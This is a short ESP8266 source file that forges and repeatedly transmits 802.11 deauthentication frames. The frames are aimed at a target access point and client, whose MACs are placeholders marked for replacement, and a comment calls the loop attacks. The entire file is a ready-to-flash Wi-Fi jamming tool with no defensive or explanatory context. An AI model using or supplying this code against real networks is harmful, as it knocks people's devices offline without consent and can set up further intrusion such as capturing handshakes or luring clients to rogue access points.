//for esp8266
#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
}

void deauthTarget(uint8_t *apMac, uint8_t *staMac) {
  const uint8_t packet[] = {
    0xC0, 0x00, 0x3A, 0x01,                         // Type, Subtype, Duration
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5], // Destination (AP)
    staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5], // Source (Client)
    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5], // BSSID (AP)
    0x00, 0x00,                                     // Sequence number
    0x07, 0x00,                                     // Reason code
  };

  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom((uint8_t*)packet, sizeof(packet), 0);
    delay(1);
  }
}

void loop() {
  uint8_t apMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED}; // Replace with target AP MAC
  uint8_t staMac[6] = {0xCA, 0xFE, 0xBA, 0xBE, 0xBA, 0xBE}; // Replace with target client MAC

  deauthTarget(apMac, staMac);
  delay(5000); // Delay between attacks
}
